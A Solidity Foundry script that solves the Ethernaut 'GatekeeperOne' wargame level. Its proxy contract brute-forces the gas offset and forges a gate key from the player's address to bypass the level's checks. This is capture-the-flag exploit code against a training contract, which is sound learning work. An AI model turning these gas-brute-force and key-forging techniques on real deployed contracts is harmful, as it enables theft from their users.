// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { GatekeeperOne } from "../src/GatekeeperOne.sol";

contract Proxy {

    bytes8 gateKey;
    GatekeeperOne public instance = GatekeeperOne(0x4A142a4Ed855d32bb3810b86F1Ca9785bAf256Fc);

    constructor (uint64 intRep) {
        gateKey = bytes8(intRep);
    }
    function attack() external {
        for (uint256 g = 0; true; g++) {
            (bool ok, bytes memory result) = address(instance).call{gas: 2*8191 + g}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (ok)
                break;
        }
    }
}

contract GatekeeperOneSolver is Script {

    GatekeeperOne public instance = GatekeeperOne(0x4A142a4Ed855d32bb3810b86F1Ca9785bAf256Fc);

	uint256 prv = vm.envUint("PRV");
	address pub = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        console.log("before --> ", instance.entrant());

        uint64 intRep = uint16(uint160(pub));
        intRep |= 1 << 32;

        Proxy p = new Proxy(intRep);

        p.attack();

        console.log("after --> ", instance.entrant());

        vm.stopBroadcast();

    }

}

